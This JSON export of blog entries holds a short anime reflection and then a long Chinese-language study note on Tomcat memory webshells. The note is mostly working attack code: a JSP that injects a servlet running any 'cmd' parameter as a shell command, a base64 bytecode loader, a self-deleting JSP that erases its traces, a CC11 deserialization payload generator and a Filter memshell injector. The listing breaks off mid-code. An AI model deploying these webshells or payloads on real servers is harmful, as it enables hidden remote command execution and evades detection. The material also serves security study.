[{"categories":[],"contents":"16年re0刚播的时候正好是初三，还处在狂热的中二期（悲），出第二季的时候上了大学，现在，我在大二的末尾重看这两季，心境和之前很不一样\nret=127\nret=127\nret=127\nret=127\nret=127\nret=127\nret=127\n","date":"2022-06-09T23:41:38+08:00","permalink":"https://amiaaaz.github.io/relax/emiriatan-maji-tenshi/","section":"relax","tags":[],"title":"二刷Re0所感"},{"categories":["NOTES\u0026SUMMARY"],"contents":"各路博客没少看，踩的坑怎么还超级多呢……所有参考链接附在文末\n本文涉及到的Java环境\u0026amp;相关依赖，仅供参考：\nJava 1.8.0_311 (8u311)\ntomcat-embed-core 8.5.73, tomcat-embed-jasper 8.5.73\ncommons-collections 3.2.1\njavassist 3.20.0-GA\njsp\u0026amp;文件落地 可能很多人会觉得：都内存马了怎么还能文件落地？？？\n有一说一，确实，但逻辑不是这样讲的：应该是内存马可以做到文件不落地——也就是说删除上马时凭借的.java .jsp .class文件后一样可以运行于内存中并执行命令（除非单独kill），而上马的过程中根据使用手段的不同会产生一定程度的文件落地\n对于jsp来说，一定会在初次请求时被tomcat自动生成对应的.java和.class文件并放在临时目录中，毕竟jsp本质就是一个Servlet，基于此，所有的jsp webshell都会产生文件落地（除非自删除 参见后面的三级标题）\n而jsp webshell，三梦师傅的都0202年了老嗨还在用的 - 各种姿势jsp webshell已经杀死了比赛，下面我们重点来看内存马\n虚假的jsp 代码参考自JAVA内存马的“一生”\n\u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Scanner\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.PrintWriter\u0026#34; %\u0026gt; \u0026lt;%@ page language=\u0026#34;java\u0026#34; contentType=\u0026#34;text/html; charset=UTF-8\u0026#34; pageEncoding=\u0026#34;UTF-8\u0026#34;%\u0026gt; \u0026lt;% final String name = \u0026#34;servletshell\u0026#34;; // 获取上下文 ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); // 注册Servlet对象 并重写service方法 Servlet servlet = new Servlet() { @Override public void init(ServletConfig servletConfig) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { String cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;); // get传入cmd参数 // 确定目标操作系统 boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[] {\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[] {\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; // 确定命令执行的格式 // 处理输入\u0026amp;命令执行 InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); // 回显执行结果 Scanner s = new Scanner( in ).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } @Override public String getServletInfo() { return null; } @Override public void destroy() { } }; // 创建Wrapper对象来封装前面new Servlet对象 org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper(); newWrapper.setName(name); newWrapper.setLoadOnStartup(1); newWrapper.setServlet(servlet); newWrapper.setServletClass(servlet.getClass().getName()); // 为内存马添加路由映射 standardContext.addChild(newWrapper); standardContext.addServletMappingDecoded(\u0026#34;/servletmemshell\u0026#34;,name); response.getWriter().write(\u0026#34;inject success\u0026#34;); %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;servletshell\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 很好理解，通过注册Servlet并重写service方法来做到命令执行+回显，访问一次这个jsp就可以添加Servlet类型内存马到/servletmemshell路径下，但我们借助java-memshell-scanner就可以发现事情没我们想的那么完美\n把它dump下来\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package org.apache.jsp; import java.io.IOException; import java.io.InputStream; import java.io.PrintWriter; import java.util.Scanner; import javax.servlet.Servlet; import javax.servlet.ServletConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; class test_jsp$1 implements Servlet { test_jsp$1(test_jsp var1) { this.this$0 = var1; } public void init(ServletConfig servletConfig) throws ServletException { } public ServletConfig getServletConfig() { return null; } public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { String cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;); boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = (new Scanner(in)).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } public String getServletInfo() { return null; } public void destroy() { } } 可以说所谓的“内存马”显露无疑，被看的干干净净\n究其原因并不复杂，这里dump下来的test_jsp$1.class文件就是jsp马中Servlet servlet = new Servlet(){}的部分，它实现了servletshell的主要功能；而因为Servlet直接被注册到当前上下文中了，所以当我们手动删除这个jsp和附带的所有.class文件后会发现/servletshell路径下的内存马依旧可以照常工作，memshell scanner会这样显示\n真 · 内存马，不过只要使用memshell scanner的kill功能（从上下文中解绑Servlet）即可杀掉这个马，并且由于此前删掉了上马所用的.jsp文件，所以做到了彻底清除servletshell\n字节码jsp 可能有师傅能看出问题所在：这就离谱，你内存马都不用个字节码加载 这肯定会连着jsp文件一起被编译啊？？？\n有一说一，确实，那我们把上面的在jsp内直接new Servlet的做法换做字节码的形式\n\u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page language=\u0026#34;java\u0026#34; contentType=\u0026#34;text/html; charset=UTF-8\u0026#34; pageEncoding=\u0026#34;UTF-8\u0026#34;%\u0026gt; \u0026lt;% String classCode = \u0026#34;yv66vgAAADQAkQoAHQBNCAA0CwBOAE8IAFAKAFEAUgoACQBTCABUCgAJAFUHAFYIAFcIAFgIAFkIAFoKAFsAXAoAWwBdCgBeAF8HAGAKABEAYQgAYgoAEQBjCgARAGQKABEAZQgAZgsAZwBoCgBpAGoKAGkAawoAaQBsBwBtBwBuBwBvAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1MU2VydmxldFRlc3Q7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAcAEAEGdldFNlcnZsZXRDb25maWcBAB8oKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdpc0xpbnV4AQABWgEABW9zVHlwAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQANU3RhY2tNYXBUYWJsZQcAVgcAOgcAcQcAYAcAcgEADmdldFNlcnZsZXRJbmZvAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAEFNlcnZsZXRUZXN0LmphdmEMAB8AIAcAcwwAdAB1AQAHb3MubmFtZQcAdgwAdwB1DAB4AEkBAAN3aW4MAHkAegEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwB7DAB8AH0MAH4AfwcAgAwAgQCCAQARamF2YS91dGlsL1NjYW5uZXIMAB8AgwEAAlxhDACEAIUMAIYAhwwAiABJAQAABwCJDACKAIsHAIwMAI0AjgwAjwAgDACQACABAAtTZXJ2bGV0VGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAVjbG9zZQAhABwAHQABAB4AAAAGAAEAHwAgAAEAIQAAADMAAQABAAAABSq3AAGxAAAAAgAiAAAACgACAAAACgAEAAsAIwAAAAwAAQAAAAUAJAAlAAAAAQAmACcAAgAhAAAANQAAAAIAAAABsQAAAAIAIgAAAAYAAQAAAA4AIwAAABYAAgAAAAEAJAAlAAAAAAABACgAKQABACoAAAAEAAEAKwABACwALQABACEAAAAsAAEAAQAAAAIBsAAAAAIAIgAAAAYAAQAAABEAIwAAAAwAAQAAAAIAJAAlAAAAAQAuAC8AAgAhAAABigAEAAsAAAChKxICuQADAgBOBDYEEgS4AAU6BRkFxgATGQW2AAYSB7YACJkABgM2BBUEmQAYBr0ACVkDEgpTWQQSC1NZBS1TpwAVBr0ACVkDEgxTWQQSDVNZBS1TOga4AA4ZBrYAD7YAEDoHuwARWRkHtwASEhO2ABQ6CBkItgAVmQALGQi2ABanAAUSFzoJLLkAGAEAOgoZChkJtgAZGQq2ABoZCrYAG7EAAAADACIAAAA6AA4AAAAVAAkAFwAMABgAEwAZACUAGgAoABwAVgAeAGMAIABzACEAhwAiAI8AIwCWACQAmwAlAKAAJgAjAAAAcAALAAAAoQAkACUAAAAAAKEAMAAxAAEAAAChADIAMwACAAkAmAA0ADUAAwAMAJUANgA3AAQAEwCOADgANQAFAFYASwA5ADoABgBjAD4AOwA8AAcAcwAuAD0APgAIAIcAGgA/ADUACQCPABIAQABBAAoAQgAAACEABf4AKAcAQwEHAEMZUQcARP4ALgcARAcARQcARkEHAEMAKgAAAAYAAgArAEcAAQBIAEkAAQAhAAAALAABAAEAAAACAbAAAAACACIAAAAGAAEAAAApACMAAAAMAAEAAAACACQAJQAAAAEASgAgAAEAIQAAACsAAAABAAAAAbEAAAACACIAAAAGAAEAAAAtACMAAAAMAAEAAAABACQAJQAAAAEASwAAAAIATA==\u0026#34;; // 获取上下文 ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, byte[].class, int.class, int.class); defineClass.setAccessible(true); byte[] evil = java.util.Base64.getDecoder().decode(classCode); Class\u0026lt;?\u0026gt; servletClass = (Class\u0026lt;?\u0026gt;) defineClass.invoke(classLoader, evil, 0, evil.length); final String name = \u0026#34;servletshell\u0026#34;; // 使用 Wrapper 封装 Servlet org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper(); newWrapper.setName(name); newWrapper.setLoadOnStartup(1); newWrapper.setServlet((Servlet) servletClass.newInstance()); newWrapper.setServletClass(servletClass.getName()); // 为内存马添加路由映射 standardContext.addChild(newWrapper); standardContext.addServletMappingDecoded(\u0026#34;/servletmemshell\u0026#34;,name); response.getWriter().write(\u0026#34;inject success\u0026#34;); %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;servletshell\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 不过并没有看起来这么美好——服务器上一下子多了1个jsp 1个class 1个java\n金蝉脱壳的jsp 对于上面示范的动静较大的2种方式不能说一无是处吧，只能说是乏善可陈，而在Tomcat容器攻防笔记之JSP金蝉脱壳这篇文章中作者提出了jsp金蝉脱壳的思路，代码如下\n\u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Request\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.mapper.MappingData\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.Wrapper\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.jasper.compiler.JspRuntimeContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.concurrent.ConcurrentHashMap\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.jasper.servlet.JspServletWrapper\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.jasper.JspCompilationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.File\u0026#34; %\u0026gt; \u0026lt;% //从request对象中获取request属性 Field requestF = request.getClass().getDeclaredField(\u0026#34;request\u0026#34;); requestF.setAccessible(true); Request req = (Request) requestF.get(request); //获取MappingData MappingData mappingData = req.getMappingData(); //获取StandrardWrapper Field wrapperF = mappingData.getClass().getDeclaredField(\u0026#34;wrapper\u0026#34;); wrapperF.setAccessible(true); Wrapper wrapper = (Wrapper) wrapperF.get(mappingData); //获取jspServlet对象 Field instanceF = wrapper.getClass().getDeclaredField(\u0026#34;instance\u0026#34;); instanceF.setAccessible(true); Servlet jspServlet = (Servlet) instanceF.get(wrapper); //获取rctxt属性 Field rctxt = jspServlet.getClass().getDeclaredField(\u0026#34;rctxt\u0026#34;); rctxt.setAccessible(true); JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet); //获取jsps属性内容 Field jspsF = jspRuntimeContext.getClass().getDeclaredField(\u0026#34;jsps\u0026#34;); jspsF.setAccessible(true); ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext); //获取对应的JspServletWrapper JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath()); //获取ctxt属性保存的JspCompilationContext对象 Field ctxt = jsw.getClass().getDeclaredField(\u0026#34;ctxt\u0026#34;); ctxt.setAccessible(true); JspCompilationContext jspCompContext = (JspCompilationContext) ctxt.get(jsw); File targetFile; targetFile = new File(jspCompContext.getClassFileName());\t//删掉jsp的.class targetFile.delete(); targetFile = new File(jspCompContext.getServletJavaFileName());\t//删掉jsp的java文件 targetFile.delete(); //删除jsp文件 String __jspName = this.getClass().getSimpleName().replaceAll(\u0026#34;_\u0026#34;, \u0026#34;.\u0026#34;); String path=application.getRealPath(__jspName); File file = new File(path); file.delete(); %\u0026gt; 通过大量的反射修改tomcat对jsp编译时的一些设置，做到上马后删除自身jsp并跳过jsp编译为class和java文件的过程，可以完全不留痕——好！！很有精神！！！\n反序列化 虽然前面我们得到了可以删除自身的金蝉脱壳jsp，但有个灵魂拷问——如果能传jsp了为什么不直接传冰蝎？确实，实际场景/CTF中更多的是反序列化RCE，为了方便我们可能会接着上内存马，如果能再扩展一下冰蝎或哥斯拉那就更好了\n以CC11链为例，这是它的基本链\npackage ccTest; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; @SuppressWarnings(\u0026#34;all\u0026#34;) public class CC11 { protected static byte[] getBytescode() throws Exception { // 利用javassist动态创建恶意字节码 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); // 设置父类为AbstractTranslet 避免报错 return cc.toBytecode(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, new byte[][]{getBytescode()}); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;name\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); InvokerTransformer transformer = new InvokerTransformer(\u0026#34;asdfasdfasdf\u0026#34;, new Class[0], new Object[0]);\t// 占位 LazyMap map = (LazyMap)LazyMap.decorate(new HashMap(),transformer); TiedMapEntry tiedmap = new TiedMapEntry(map,templates); HashSet hashset = new HashSet(1); hashset.add(\u0026#34;foo\u0026#34;); Field f = null; try { f = HashSet.class.getDeclaredField(\u0026#34;map\u0026#34;); } catch (NoSuchFieldException e) { f = HashSet.class.getDeclaredField(\u0026#34;backingMap\u0026#34;); } f.setAccessible(true); HashMap hashset_map = (HashMap) f.get(hashset); Field f2 = null; try { f2 = HashMap.class.getDeclaredField(\u0026#34;table\u0026#34;); } catch (NoSuchFieldException e) { f2 = HashMap.class.getDeclaredField(\u0026#34;elementData\u0026#34;); } f2.setAccessible(true); // 替换key为TiedMap Object[] array = (Object[])f2.get(hashset_map); Object node = array[0]; if(node == null){ node = array[1]; } Field keyField = null; try{ setFieldValue(node, \u0026#34;key\u0026#34;, tiedmap); }catch(Exception e){ keyField = Class.forName(\u0026#34;java.util.MapEntry\u0026#34;).getDeclaredField(\u0026#34;key\u0026#34;); keyField.setAccessible(true); keyField.set(node,tiedmap); } // 替换 防止生成payload的时候就触发rce setFieldValue(transformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;./cc11\u0026#34;)); outputStream.writeObject(hashset); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;./cc11\u0026#34;)); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } 具体的我就不多分析了，可以近似为CC2+CC6，用TemplatestImpl加载字节码，恶意类由javassist生成\n如何扩展这个看起来只能执行单句指令的简易poc？简单，我们将tomcat Filter内存马部分单独写一份TomcatInject.java文件，替换掉这里的getBytescode，让它不要自己生成恶意类了，直接读取TomcatInject.class的字节码即可\npackage ccTest; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; @SuppressWarnings(\u0026#34;all\u0026#34;) public class CC11Template { public static void main(String[] args) throws Exception { byte[] bytes = getBytes(); byte[][] targetByteCodes = new byte[][]{bytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f0 = templates.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;); f0.setAccessible(true); f0.set(templates,targetByteCodes); f0 = templates.getClass().getDeclaredField(\u0026#34;_name\u0026#34;); f0.setAccessible(true); f0.set(templates,\u0026#34;name\u0026#34;); f0 = templates.getClass().getDeclaredField(\u0026#34;_class\u0026#34;); f0.setAccessible(true); f0.set(templates,null); // 利用反射调用 templates 中的 newTransformer 方法 InvokerTransformer transformer = new InvokerTransformer(\u0026#34;asdfasdfasdf\u0026#34;, new Class[0], new Object[0]); HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer); TiedMapEntry tiedmap = new TiedMapEntry(map,templates); HashSet hashset = new HashSet(1); hashset.add(\u0026#34;foo\u0026#34;); // 我们要设置 HashSet 的 map 为我们的 HashMap Field f = null; try { f = HashSet.class.getDeclaredField(\u0026#34;map\u0026#34;); } catch (NoSuchFieldException e) { f = HashSet.class.getDeclaredField(\u0026#34;backingMap\u0026#34;); } f.setAccessible(true); HashMap hashset_map = (HashMap) f.get(hashset); Field f2 = null; try { f2 = HashMap.class.getDeclaredField(\u0026#34;table\u0026#34;); } catch (NoSuchFieldException e) { f2 = HashMap.class.getDeclaredField(\u0026#34;elementData\u0026#34;); } f2.setAccessible(true); Object[] array = (Object[])f2.get(hashset_map); Object node = array[0]; if(node == null){ node = array[1]; } Field keyField = null; try{ keyField = node.getClass().getDeclaredField(\u0026#34;key\u0026#34;); }catch(Exception e){ keyField = Class.forName(\u0026#34;java.util.MapEntry\u0026#34;).getDeclaredField(\u0026#34;key\u0026#34;); } keyField.setAccessible(true); keyField.set(node,tiedmap); // 在 invoke 之后， Field f3 = transformer.getClass().getDeclaredField(\u0026#34;iMethodName\u0026#34;); f3.setAccessible(true); f3.set(transformer,\u0026#34;newTransformer\u0026#34;); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;./cc11Test4.ser\u0026#34;)); outputStream.writeObject(hashset); outputStream.close(); }catch(Exception e){ e.printStackTrace(); } } public static byte[] getBytes() throws IOException { InputStream inputStream = new FileInputStream(new File(\u0026#34;E:\\\\JavaStudy\\\\test05\\\\target\\\\classes\\\\ccTest\\\\TomcatInject.class\u0026#34;)); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); int n = 0; while ((n=inputStream.read())!=-1){ byteArrayOutputStream.write(n); } byte[] bytes = byteArrayOutputStream.toByteArray(); return bytes; } } 有了这个CC11的模板，剩下的就是注入内存马部分了，详细分析可以参见三梦师傅的基于tomcat的内存 Webshell 无文件攻击技术（太强了太强了），代码如下（有稍作修改）\npackage ccTest; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.LifecycleState; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.lang.reflect.Modifier; import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletContext; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; public class TomcatInject extends AbstractTranslet implements Filter { private final String cmdParamName = \u0026#34;cmd\u0026#34;; private final static String filterUrlPattern = \u0026#34;/*\u0026#34;; private final static String filterName = \u0026#34;amiz\u0026#34;; static { try { // 反射修改WRAP_SAME_OBJECT值为true Class c = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationDispatcher\u0026#34;); java.lang.reflect.Field f = c.getDeclaredField(\u0026#34;WRAP_SAME_OBJECT\u0026#34;); java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); // 获取modifiers字段 modifiersField.setAccessible(true); //将变量设置为可访问 modifiersField.setInt(f, f.getModifiers() \u0026amp; ~Modifier.FINAL); // 取消FINAL属性 f.setAccessible(true); // 将变量设置为可访问 if (!f.getBoolean(null)) { f.setBoolean(null, true); // 将变量设置为true } // 初始化lastServicedRequest c = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationFilterChain\u0026#34;); f = c.getDeclaredField(\u0026#34;lastServicedRequest\u0026#34;); modifiersField = f.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() \u0026amp; ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); //设置ThreadLocal对象 } // 初始化lastServicedResponse f = c.getDeclaredField(\u0026#34;lastServicedResponse\u0026#34;); modifiersField = f.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() \u0026amp; ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); // 设置ThreadLocal对象 } // 获取上下文StandardContext ServletContext servletContext = getServletContext(); if (servletContext != null){ Field ctx = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); ctx.setAccessible(true); ApplicationContext appctx = (ApplicationContext) ctx.get(servletContext); Field stdctx = appctx.getClass().getDeclaredField(\u0026#34;context\u0026#34;); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(appctx); if (standardContext != null){ // 这样设置不会抛出报错 Field stateField = org.apache.catalina.util.LifecycleBase.class .getDeclaredField(\u0026#34;state\u0026#34;); stateField.setAccessible(true); stateField.set(standardContext, LifecycleState.STARTING_PREP); Filter myFilter =new TomcatInject(); // 调用doFilter来动态添加Filter 也可以利用反射 javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(filterName,myFilter); // 进行一些简单的设置 filterRegistration.setInitParameter(\u0026#34;encoding\u0026#34;, \u0026#34;utf-8\u0026#34;); filterRegistration.setAsyncSupported(false); // 设置基本的 url pattern filterRegistration .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{\u0026#34;/*\u0026#34;}); // 将服务重新修改回来，不然的话服务会无法正常进行 if (stateField != null){ stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } // 设置好之后调用filterstart来启动我们的 filter if (standardContext != null){ Method filterStartMethod = StandardContext.class.getDeclaredMethod(\u0026#34;filterStart\u0026#34;); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext,null); // 把filter插到第一位 Class ccc = null; try { ccc = Class.forName(\u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34;); } catch (Throwable t){} if (ccc == null) { try { ccc = Class.forName(\u0026#34;org.apache.catalina.deploy.FilterMap\u0026#34;); } catch (Throwable t){} } 